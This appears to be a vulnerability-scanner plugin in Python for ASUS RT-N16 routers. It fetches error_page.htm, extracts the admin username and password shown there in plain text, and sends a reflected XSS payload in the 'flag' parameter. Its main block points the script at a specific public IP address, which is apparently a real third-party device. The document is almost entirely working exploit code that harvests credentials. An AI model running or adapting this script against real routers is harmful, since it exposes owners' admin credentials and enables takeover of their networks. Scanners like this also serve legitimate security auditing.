#!/usr/bin/env python
# coding: UTF-8

#author: yichin
#name: ASUS RT-N16 - Text-plain Admin Password Disclosure and reflected xss
#refer: https://sintonen.fi/advisories/asus-router-auth-bypass.txt
#description:
'''
asus RT_N16路由器存在管理员密码泄露漏洞，访问http://192.168.1.1/error_page.htm，管理员密码包含在如下的字符串中：
if('1' == '0' || 'password' == 'admin')
'''

import re
import urlparse


def assign(service, arg):
    if service == 'www':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    #admin pass disclosure
    url = arg + 'error_page.htm'
    code,head,res,errcode,_ = curl.curl2(url)
    if code == 200:
        m = re.search(r"if\('1' == '0' \|\| '([\S]*)' == '([\S]*)'", res)
        if m:
            security_hole('Admin Password Disclosure {username}:{password}'.format(username=m.group(2),password=m.group(1)))

    #Reflected xss
    url = arg + 'error_page.htm?flag=%27%2balert(%27XSS%27)%2b%27'
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 200 and "casenum = ''+alert('XSS')+'';" in res:
        security_warning(url + ' reflected xss')
    else:
        pass
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('www','http://220.130.160.199:8089/')[1])